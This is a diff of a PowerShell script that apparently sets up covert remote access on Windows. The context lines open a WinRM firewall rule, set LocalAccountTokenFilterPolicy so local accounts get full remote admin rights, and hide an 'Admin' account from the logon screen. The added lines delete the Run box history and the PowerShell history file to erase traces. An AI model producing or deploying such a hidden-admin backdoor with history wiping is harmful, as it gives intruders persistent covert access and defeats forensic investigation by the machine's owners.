@@ -40,5 +40,11 @@ New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction I
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force
 
+# Delete run box history
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force
+
+# Delete powershell history
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
 # Exit PowerShell session
 Exit
